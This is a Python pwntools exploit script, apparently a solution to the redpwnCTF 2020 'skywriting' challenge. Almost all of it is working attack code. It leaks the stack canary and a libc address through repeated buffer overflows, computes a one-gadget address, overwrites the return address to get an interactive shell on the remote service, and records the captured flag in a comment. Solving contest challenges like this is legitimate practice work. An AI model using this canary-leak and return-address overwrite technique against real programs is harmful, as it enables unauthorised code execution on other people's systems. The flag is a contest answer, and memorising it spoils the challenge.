from pwn import *

file = "./skywriting"

context.binary = file
context.log_level = 'debug'

bin = ELF(file)
#r = process(file)
#raw_input()
r = remote("2020.redpwnc.tf", 31034)
# flag{a_cLOud_iS_jUSt_sOmeBodY_eLSes_cOMpUteR}

r.sendlineafter("Hello there, do you want to write on the sky?", "1")
r.sendlineafter("Is the answer intuitive yet? Give it your best shot:", "asd")

r.sendafter("Try again, give it another shot:", ("A" * 136) + "B")
r.recvuntil("AAB")
canary = unpack(r.recv(7).rjust(8, "\x00"))

r.sendafter("Try again, give it another shot:", "A" * 148 + "BBBB")
r.recvuntil("BBBB")
libcLeakAddr = unpack(r.recv(6).ljust(8, "\x00"))
libcBaseAddr = libcLeakAddr - 0x21b97
gadgetAddr = libcBaseAddr + 0x4f2c5

print "[*] libc base 0x%x" % libcBaseAddr
print "[*] gadget 0x%x" % gadgetAddr
print "[*] canary 0x%x" % canary

popRDIAddr = bin.search(asm('pop rdi;ret;')).next()
popRSIR15Addr = bin.search(asm('pop rsi; pop r15; ret;')).next()
retAddr = bin.search(asm('ret;')).next()

payload = "A" * 136
payload += pack(canary)
payload += pack(0xdeadbeef)
payload += pack(gadgetAddr)
payload += "\x90" * 0x60

r.sendafter("Try again, give it another shot:", payload)
r.sendafter("Try again, give it another shot:", "notflag{a_cloud_is_just_someone_elses_computer}\n\x00")

r.interactive()
